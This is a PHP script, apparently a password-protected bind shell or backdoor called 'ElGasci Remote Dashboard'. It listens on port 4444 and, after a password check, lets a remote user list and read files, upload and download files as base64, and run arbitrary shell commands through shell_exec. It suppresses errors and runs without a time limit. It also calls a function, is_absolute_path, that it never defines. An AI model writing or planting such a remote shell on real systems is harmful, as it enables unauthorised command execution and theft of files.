<?php
set_time_limit(0);
error_reporting(0);

// Config
$host = "0.0.0.0";
$port = 4444;
$client_password_hash = '$2y$10$CPPpA19ftHLorZgyOuw33.IaGcM8YtKRYJs1XyDTSIkSVK4aztrPO'; // bcrypt
$user = "El";
$hostname = "Gasci";

$script_dir = __DIR__;
$upload_dir = $script_dir . "/uploads";
if (!file_exists($upload_dir)) mkdir($upload_dir, 0777, true);

// ANSI colors
define("CYAN", "\033[36m");
define("GREEN", "\033[32m");
define("BLUE", "\033[34m");
define("MAGENTA", "\033[35m");
define("RED", "\033[31m");
define("RESET", "\033[0m");

// Helper
function send($conn, $msg) {
    fwrite($conn, $msg . "\r\n");
}

function prompt($cwd) {
    global $user, $hostname;
    return "\r\n" . CYAN . "$user@$hostname:$cwd" . RESET . "$ ";
}

function list_dir($cwd) {
    $items = scandir($cwd);
    $output = [];
    foreach($items as $item) {
        if ($item === "." || $item === "..") continue;
        $full = $cwd . "/" . $item;
        if (is_dir($full)) $output[] = BLUE . $item . RESET;
        elseif (is_executable($full)) $output[] = MAGENTA . $item . RESET;
        else $output[] = GREEN . $item . RESET;
    }
    return implode("  ", $output);
}

function read_file($cwd, $file) {
    $path = $cwd . "/" . $file;
    if (file_exists($path)) return file_get_contents($path);
    else return RED . "[ERROR] File not found" . RESET;
}

function upload_file($cwd, $file, $content_b64) {
    $data = base64_decode($content_b64);
    $path = $cwd . "/" . $file;
    if (file_put_contents($path, $data) !== false)
        return GREEN . "[UPLOAD] $file uploaded" . RESET;
    else
        return RED . "[ERROR] Upload failed" . RESET;
}

function download_file($cwd, $file) {
    $path = $cwd . "/" . $file;
    if (file_exists($path))
        return base64_encode(file_get_contents($path));
    else
        return RED . "[ERROR] File not found" . RESET;
}

// Server
$server = stream_socket_server("tcp://$host:$port", $errno, $errstr);
if (!$server) die("Cannot bind socket: $errstr\n");

echo "[+] Listening on $host:$port\n";

while ($conn = @stream_socket_accept($server)) {
    fwrite($conn, CYAN . "=== ElGasci Remote Dashboard ===" . RESET . "\r\n");
    fwrite($conn, "[*] Please enter password: ");

    $password = trim(fgets($conn));
    if (!password_verify($password, $client_password_hash)) {
        send($conn, RED . "[!] Wrong password" . RESET);
        fclose($conn);
        continue;
    }

    send($conn, GREEN . "[+] Access granted! Type 'help' for commands." . RESET);

    $current_dir = $upload_dir;

    while (!feof($conn)) {
        fwrite($conn, prompt($current_dir));
        $cmd = trim(fgets($conn));
        if (!$cmd) continue;

        $parts = explode(" ", $cmd, 3);
        $command = strtolower($parts[0]);

        switch($command) {
            case "exit":
                send($conn, "[*] Goodbye!");
                fclose($conn);
                break 2;
            case "help":
                send($conn,
                    "Commands:\n".
                    "ls                     - list directory\n".
                    "cd <dir>               - change directory\n".
                    "pwd                    - print working directory\n".
                    "cat <file>             - view file\n".
                    "upload <file> <base64> - upload file\n".
                    "download <file>        - download file\n".
                    "help                   - show help\n".
                    "exit                   - exit shell"
                );
                break;
            case "ls":
                send($conn, list_dir($current_dir));
                break;
            case "pwd":
                send($conn, $current_dir);
                break;
            case "cd":
                if (!isset($parts[1])) {
                    send($conn, "Usage: cd <dir>");
                    break;
                }
                $path = $parts[1];
                $new_dir = is_absolute_path($path) ? $path : $current_dir . "/" . $path;
                if (is_dir($new_dir)) $current_dir = realpath($new_dir);
                else send($conn, RED . "Directory not found" . RESET);
                break;
            case "cat":
                if (!isset($parts[1])) { send($conn,"Usage: cat <file>"); break;}
                send($conn, read_file($current_dir, $parts[1]));
                break;
            case "upload":
                if (!isset($parts[2])) { send($conn,"Usage: upload <file> <base64>"); break;}
                send($conn, upload_file($current_dir, $parts[1], $parts[2]));
                break;
            case "download":
                if (!isset($parts[1])) { send($conn,"Usage: download <file>"); break;}
                send($conn, download_file($current_dir, $parts[1]));
                break;
            default:
                // shell execution
                $output = shell_exec("cd " . escapeshellarg($current_dir) . " && $cmd 2>&1");
                send($conn, $output ?: "");
        }
    }
}
?>
